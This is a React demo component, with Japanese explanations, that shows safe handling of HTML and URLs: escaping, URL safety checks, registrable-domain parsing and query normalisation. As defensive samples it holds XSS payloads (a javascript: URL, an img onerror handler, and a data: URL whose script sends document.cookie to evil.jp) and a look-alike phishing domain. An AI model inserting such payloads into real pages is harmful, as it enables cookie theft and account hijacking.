"use client";
/**
 * HTML / URL の安全な扱いのデモ。
 *
 * UI は **@platform/ui の部品だけ**で組む(CLAUDE.md「UI 部品は @platform/ui を使う」)。
 */
import * as React from "react";
import { Button, Input, Textarea, Badge, Alert, Separator } from "@platform/ui";
import { escapeHtml, stripTags, embedAsText, zenkakuToHankaku, zenkakuSpaceToHankaku, nl2br, truncate, linkify } from "@platform/html";
import {
  isSafeUrl,
  isHttpUrl,
  isValidUrl,
  isExternalUrl,
  normalizeUrl,
  urlsEqual,
  getHostname,
  getRegistrableDomain,
  getSubdomain,
  getTld,
  parseQuery,
  stringifyQuery,
  setParams,
  keepParams,
  removeParam,
} from "@platform/url";

const box: React.CSSProperties = {
  border: "1px solid var(--color-border)",
  borderRadius: "var(--radius)",
  background: "var(--color-surface)",
  padding: 16,
  marginBottom: 16,
};

const mono: React.CSSProperties = { fontFamily: "monospace", fontSize: 12, wordBreak: "break-all" };

const code: React.CSSProperties = {
  ...mono,
  display: "block",
  background: "var(--color-bg)",
  border: "1px solid var(--color-border)",
  borderRadius: 4,
  padding: "6px 8px",
  lineHeight: 1.6,
};

/** 利用者が入力しうる URL の例。**どれも実際に来る**。 */
const URL_SAMPLES = [
  "https://example.co.jp/help",
  "javascript:alert(document.cookie)",
  "data:text/html,<script>fetch('//evil.jp?c='+document.cookie)</script>",
  "http://社内.example.co.jp/",
  "ftp://files.example.co.jp/",
  "//example.co.jp/protocol-relative",
];

const HOST_SAMPLES = [
  "https://www.example.co.jp/a/b",
  "https://shop.example.co.jp/",
  "https://example.co.jp.evil.com/login",
  "https://192.168.1.1/admin",
];

export function SafeHtmlDemo() {
  const [danger, setDanger] = React.useState('<img src=x onerror="alert(document.cookie)">\n山田さんの<b>コメント</b>');
  const [url, setUrl] = React.useState("javascript:alert(document.cookie)");
  const [jp, setJp] = React.useState("ＡＢＣ－１２３　（全角スペース）");
  const [query, setQuery] = React.useState("https://example.co.jp/search?q=%E6%A4%9C%E7%B4%A2&page=1&utm_source=mail&utm_medium=cta");

  const safe = isSafeUrl(url);
  const parsed = parseQuery(query.includes("?") ? query.slice(query.indexOf("?")) : "");

  return (
    <>
      <h1 style={{ fontSize: "1.5rem", fontWeight: 700, marginBottom: 4 }}>HTML / URL の安全な扱い</h1>
      <p style={{ fontSize: 13, color: "var(--color-muted)", lineHeight: 1.8, marginBottom: 20 }}>
        <strong>利用者が入力した文字列を、そのまま画面に出さない。リンクにしない。</strong>
        当たり前ですが、<strong>「どこまでやれば安全か」を各アプリで判断すると必ず穴が空きます</strong>。
        <code>@platform/html</code> と <code>@platform/url</code> がその判断を持っています。
      </p>

      <div style={box}>
        <h2 style={{ fontSize: 15, fontWeight: 700, marginBottom: 8 }}>① 利用者の入力を画面に出す</h2>
        <Textarea value={danger} onChange={(e) => setDanger(e.target.value)} rows={3} style={{ marginBottom: 10 }} />

        <div style={{ fontSize: 12, lineHeight: 2 }}>
          <div style={{ color: "var(--color-muted)" }}>
            <code>escapeHtml()</code> — タグとして解釈されない
          </div>
          <span style={code}>{escapeHtml(danger)}</span>

          <div style={{ color: "var(--color-muted)", marginTop: 8 }}>
            <code>stripTags()</code> — タグを落として本文だけ
          </div>
          <span style={code}>{stripTags(danger)}</span>

          <div style={{ color: "var(--color-muted)", marginTop: 8 }}>
            <code>embedAsText()</code> — 「HTML を文字として見せたい」とき
          </div>
          <span style={code}>{embedAsText(danger)}</span>

          <div style={{ color: "var(--color-muted)", marginTop: 8 }}>
            <code>nl2br(escapeHtml(x))</code> — 改行を活かす。<strong>順序が重要</strong>
          </div>
          <span style={code}>{nl2br(escapeHtml(danger))}</span>
        </div>

        <Alert variant="warning" title="React は既定で自動エスケープします" style={{ marginTop: 12 }}>
          <span style={{ fontSize: 12, lineHeight: 1.8 }}>
            <strong>ではなぜ必要か。</strong>
            <code>dangerouslySetInnerHTML</code> を使うとき、メール本文や PDF を組み立てるとき、
            CSV に出すとき——<strong>React の外へ出た瞬間に自前で守る必要があります</strong>。
            <br />
            <code>nl2br(escapeHtml(x))</code> の順序も要点です。逆にすると <code>&lt;br&gt;</code> まで
            エスケープされて、画面に <code>&amp;lt;br&amp;gt;</code> と出ます。
          </span>
        </Alert>
      </div>

      <div style={box}>
        <h2 style={{ fontSize: 15, fontWeight: 700, marginBottom: 8 }}>② 利用者が入力した URL をリンクにする</h2>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginBottom: 10 }}>
          <Input value={url} onChange={(e) => setUrl(e.target.value)} style={{ flex: 1, minWidth: 240 }} />
          <Badge variant={safe ? "success" : "danger"}>{safe ? "リンクにしてよい" : "リンクにしない"}</Badge>
        </div>

        <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginBottom: 12 }}>
          {URL_SAMPLES.map((s) => (
            <Button key={s} size="sm" variant={url === s ? "primary" : "secondary"} onClick={() => setUrl(s)}>
              {s.length > 26 ? `${s.slice(0, 26)}…` : s}
            </Button>
          ))}
        </div>

        <table style={{ width: "100%", fontSize: 13, borderCollapse: "collapse" }}>
          <tbody>
            {[
              { fn: "isSafeUrl()", v: safe, note: "**リンクにする前に必ず通す**。javascript: と data: を弾く" },
              { fn: "isHttpUrl()", v: isHttpUrl(url), note: "http / https だけ" },
              { fn: "isValidUrl()", v: isValidUrl(url), note: "URL として解釈できるか（安全とは別）" },
              { fn: "isExternalUrl()", v: isExternalUrl(url, "example.co.jp"), note: "外部サイトか（rel=noopener を付ける判断に）" },
            ].map((r) => (
              <tr key={r.fn} style={{ borderTop: "1px solid var(--color-border)" }}>
                <td style={{ padding: 5, ...mono, width: 130 }}>{r.fn}</td>
                <td style={{ padding: 5, width: 60, fontWeight: 700, color: r.v ? "var(--color-success)" : "var(--color-danger)" }}>{String(r.v)}</td>
                <td style={{ padding: 5, fontSize: 11, color: "var(--color-muted)" }}>{r.note}</td>
              </tr>
            ))}
          </tbody>
        </table>

        <Alert variant={safe ? "info" : "danger"} title={safe ? "この URL はリンクにできます" : "この URL はリンクにしてはいけません"} style={{ marginTop: 12 }}>
          <span style={{ fontSize: 12, lineHeight: 1.8 }}>
            {safe ? (
              <>
                <code>{url}</code> は http/https なので、<code>&lt;a href&gt;</code> に入れて構いません。
                外部サイトなら <code>rel=&quot;noopener noreferrer&quot;</code> を付けてください。
              </>
            ) : (
              <>
                <strong>
                  <code>javascript:</code> や <code>data:</code> を <code>&lt;a href&gt;</code> に入れると、
                  クリックした瞬間にスクリプトが動きます。
                </strong>
                「掲示板に URL を貼れる」機能を作るとき、<strong>ここを各アプリで判断すると必ず漏れます</strong>。
                <code>isValidUrl()</code> は true を返すことに注意——<strong>「URL として正しい」と「安全」は別</strong>です。
              </>
            )}
          </span>
        </Alert>

        <Separator style={{ margin: "14px 0" }} />

        <div style={{ fontSize: 12, color: "var(--color-muted)", marginBottom: 6 }}>
          <code>linkify()</code> — 本文中の URL を自動でリンクに
        </div>
        <span style={code}>{linkify("詳細は https://example.co.jp/help を見てください", { target: "_blank", rel: "noopener noreferrer" })}</span>
      </div>

      <div style={box}>
        <h2 style={{ fontSize: 15, fontWeight: 700, marginBottom: 8 }}>③ ドメインを見分ける</h2>
        <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
          <thead>
            <tr style={{ textAlign: "left", color: "var(--color-muted)" }}>
              <th style={{ padding: 5 }}>URL</th>
              <th style={{ padding: 5 }}>ホスト</th>
              <th style={{ padding: 5 }}>登録可能ドメイン</th>
              <th style={{ padding: 5 }}>サブ</th>
              <th style={{ padding: 5 }}>TLD</th>
            </tr>
          </thead>
          <tbody>
            {HOST_SAMPLES.map((u) => {
              const reg = getRegistrableDomain(u);
              const isOurs = reg === "example.co.jp";
              return (
                <tr key={u} style={{ borderTop: "1px solid var(--color-border)" }}>
                  <td style={{ padding: 5, ...mono }}>{u}</td>
                  <td style={{ padding: 5, ...mono, color: "var(--color-muted)" }}>{getHostname(u) ?? "—"}</td>
                  <td style={{ padding: 5, ...mono, fontWeight: 700, color: isOurs ? "var(--color-success)" : "var(--color-danger)" }}>{reg ?? "—"}</td>
                  <td style={{ padding: 5, ...mono, color: "var(--color-muted)" }}>{getSubdomain(u) ?? "—"}</td>
                  <td style={{ padding: 5, ...mono, color: "var(--color-muted)" }}>{getTld(u) ?? "—"}</td>
                </tr>
              );
            })}
          </tbody>
        </table>
        <Alert variant="danger" title="3 行目に注目してください" style={{ marginTop: 12 }}>
          <span style={{ fontSize: 12, lineHeight: 1.8 }}>
            <code>example.co.jp.evil.com</code> —— <strong>先頭に自社ドメインが入っているだけの別サイト</strong>です。
            <code>url.includes(&quot;example.co.jp&quot;)</code> で判定すると<strong>通してしまいます</strong>。
            <br />
            <code>getRegistrableDomain()</code> は <code>evil.com</code> を返すので、正しく弾けます。
            <strong><code>.co.jp</code> は 3 階層</strong>なので「後ろから 2 つ」でも間違えます——
            この判定を自作してはいけません。
          </span>
        </Alert>
      </div>

      <div style={box}>
        <h2 style={{ fontSize: 15, fontWeight: 700, marginBottom: 8 }}>④ クエリと正規化</h2>
        <Input value={query} onChange={(e) => setQuery(e.target.value)} style={{ marginBottom: 10 }} />

        <div style={{ fontSize: 12, lineHeight: 1.9 }}>
          <div style={{ color: "var(--color-muted)" }}>
            <code>parseQuery()</code> — <strong>同名キーは配列に</strong>
          </div>
          <span style={code}>{JSON.stringify(parsed)}</span>

          <div style={{ color: "var(--color-muted)", marginTop: 8 }}>
            <code>keepParams(url, [&quot;q&quot;, &quot;page&quot;])</code> — 計測パラメータを落とす
          </div>
          <span style={code}>{keepParams(query, ["q", "page"])}</span>

          <div style={{ color: "var(--color-muted)", marginTop: 8 }}>
            <code>removeParam(url, &quot;utm_source&quot;)</code>
          </div>
          <span style={code}>{removeParam(query, "utm_source")}</span>

          <div style={{ color: "var(--color-muted)", marginTop: 8 }}>
            <code>setParams(url, {"{ page: 2, sort: null }"})</code> — <strong>null は消える</strong>
          </div>
          <span style={code}>{setParams(query, { page: 2, sort: null })}</span>

          <div style={{ color: "var(--color-muted)", marginTop: 8 }}>
            <code>stringifyQuery()</code> — 配列は繰り返し、null/undefined は落とす
          </div>
          <span style={code}>{stringifyQuery({ a: 1, b: ["x", "y"], c: null, d: true })}</span>
        </div>

        <Separator style={{ margin: "14px 0" }} />

        <div style={{ fontSize: 12, color: "var(--color-muted)", marginBottom: 6 }}>
          <code>normalizeUrl()</code> — 大文字/既定ポート/`..`/クエリ順を揃える
        </div>
        <span style={code}>
          {"HTTPS://Example.co.jp:443/a/../b?b=2&a=1"}
          <br />→ {normalizeUrl("HTTPS://Example.co.jp:443/a/../b?b=2&a=1")}
        </span>
        <p style={{ fontSize: 12, color: "var(--color-muted)", marginTop: 8, lineHeight: 1.8 }}>
          <code>urlsEqual(&quot;https://a.jp/x&quot;, &quot;https://a.jp/x/&quot;)</code> ={" "}
          <b>{String(urlsEqual("https://a.jp/x", "https://a.jp/x/"))}</b>
          <br />
          <strong>末尾スラッシュの有無で「別の URL」と判定すると、重複が生まれます。</strong>
          アクセス集計・キャッシュキー・重複チェックは、必ず正規化してから比べてください。
        </p>
      </div>

      <div style={box}>
        <h2 style={{ fontSize: 15, fontWeight: 700, marginBottom: 8 }}>⑤ 全角の入力を受け止める</h2>
        <Input value={jp} onChange={(e) => setJp(e.target.value)} style={{ marginBottom: 10 }} />
        <div style={{ fontSize: 12, lineHeight: 1.9 }}>
          <div style={{ color: "var(--color-muted)" }}>
            <code>zenkakuToHankaku()</code>
          </div>
          <span style={code}>{zenkakuToHankaku(jp)}</span>
          <div style={{ color: "var(--color-muted)", marginTop: 8 }}>
            <code>zenkakuSpaceToHankaku()</code>
          </div>
          <span style={code}>{zenkakuSpaceToHankaku(jp)}</span>
          <div style={{ color: "var(--color-muted)", marginTop: 8 }}>
            <code>truncate(text, 10)</code>
          </div>
          <span style={code}>{truncate(jp, 10)}</span>
        </div>
        <p style={{ fontSize: 12, color: "var(--color-muted)", marginTop: 10, lineHeight: 1.8 }}>
          <strong>利用者は全角で入力してきます。</strong>「なぜか登録できない」の多くがこれです。
          弾くのではなく<strong>受け止めて正規化する</strong>のが、社内システムの正解です。
          <br />
          <code>/converters</code> の電話番号（<code>０９０－１２３４</code>）も同じ考え方です。
        </p>
      </div>
    </>
  );
}
